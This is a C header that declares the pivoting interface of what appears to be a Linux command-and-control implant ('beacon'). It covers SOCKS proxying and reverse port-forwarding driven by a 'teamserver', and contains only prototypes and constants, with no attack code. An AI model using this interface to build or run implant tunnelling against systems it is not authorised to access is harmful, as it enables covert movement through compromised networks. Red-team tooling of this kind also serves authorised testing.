#ifndef LINUX_BEACON_PIVOT_H
#define LINUX_BEACON_PIVOT_H

#include <stdint.h>
#include <stddef.h>

#define SOCKET_READ_MAX (1024 * 1024)

#define STATE_DEAD    0
#define STATE_READ    1
#define STATE_CONNECT 2

#define LISTEN_NOTREALLY  0
#define LISTEN_ONEOFF     1  /* SOCKS BIND: accept once, replace listener */
#define LISTEN_PERSISTENT 2  /* rportfwd: keep listening, new id per accept */

/* Match command_shell_callback(char *, int, int) — not const, same as files/download path */
typedef void (*pivot_callback)(char *buffer, int length, int type);

void pivot_init(void);
void pivot_poll(pivot_callback callback);
void pivot_cleanup(void);

/* SOCKS (teamserver → beacon) */
void command_listen_socks(const uint8_t *buffer, int length, pivot_callback cb);
void command_connect_socks(const uint8_t *buffer, int length, pivot_callback cb);
void command_send_socks(const uint8_t *buffer, int length);
void command_close_socks(const uint8_t *buffer, int length);

/* rportfwd: LSOCKET_BIND / CLOSE / bind localhost */
void command_socket_bind(const uint8_t *buffer, int length, uint32_t bind_addr);
void command_socket_close_port(const uint8_t *buffer, int length);

#endif
